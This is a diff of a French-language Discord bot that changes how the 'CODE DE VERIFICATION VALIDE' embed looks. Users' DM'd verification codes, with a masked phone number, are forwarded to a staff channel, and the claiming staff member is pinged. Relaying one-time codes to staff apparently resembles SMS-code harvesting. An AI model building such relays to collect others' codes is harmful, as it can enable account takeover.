@@ -259,18 +259,15 @@ async def handle_dm_code(message: discord.Message):
     validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
     if validation_channel:
         embed_val = discord.Embed(
-            title="CODE VALIDE",
-            description=f"**Code : `{content}`**",
+            title="CODE DE VERIFICATION VALIDE",
+            description=f"```\n  {content}  \n```",
             color=0x57f287,
             timestamp=datetime.datetime.now()
         )
-        embed_val.add_field(name="Staff", value=f"<@{claimed_by}>", inline=True)
-        embed_val.add_field(name="Utilisateur", value=f"{message.author.mention} (`{user_id}`)", inline=True)
         embed_val.add_field(name="Numero", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
-        embed_val.add_field(name="Code saisi", value=f"`{content}`", inline=True)
-        embed_val.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
-        embed_val.set_thumbnail(url=message.author.display_avatar.url)
-        embed_val.set_footer(text="Validation de verification")
+        embed_val.add_field(name="Utilisateur", value=f"{message.author.mention}", inline=True)
+        embed_val.add_field(name="Valide le", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=False)
+        embed_val.set_footer(text="Verification validee")
         await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val)
     log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
     if log_channel:
